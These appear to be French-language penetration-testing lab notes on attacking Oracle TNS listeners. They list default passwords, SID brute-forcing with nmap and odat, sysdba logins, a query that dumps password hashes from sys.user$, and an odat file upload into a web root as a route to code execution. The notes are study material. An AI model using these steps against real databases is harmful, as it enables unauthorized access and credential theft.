# Oracle Transparent Network Substrate
supporte encryption
Mot de passe par défaut

| Version |MdP |
| --- | --- |
| 9 |			CHANGE_ON_INSTALL |
| 10 |			(rien) |
| DBSNMP |	dbsnmp |
	
Fichiers de config:

| Nom | Description |
| --- | --- |
|ORACLE_HOME/network/admin/listener.ora | 	détermine le service sur lequel écouter et le comportement|
| ORACLE_HOME/network/admin/tnsnames.ora | 	Résoud les noms de services |
| ORACLE_HOME/sqldeveloper/PlsqlExclusionList |	exclue des modules PL/SQL |

# SID
Réfère à une instance de BD avec ses procéssus et sa mémoire, nécessaire pour les trouver sinon on tombe sur défaut dns tnsnames.ora
Brute force avec nmap --script oracle-sid-brute
odat.py all -s 10.129.204.235

# Connexion
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Commandes
| commande | description|
| --- | --- |
| select table_name from all_tables	|	List des tables|
|select * from user_role_privs	|			privilèges courrant|
|select name, password from sys.user$|	extraire utilisateurs et mots de passe (hashé)|

# RCE
Doit avoir un serveur web et connaître l'emplacement exacte de celui-ci

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
#envoi d'un fichier par odat
$ echo "Oracle File Upload Test" > testing.txt
$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
#exécution par http
$ curl -X GET http://10.129.204.235/testing.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
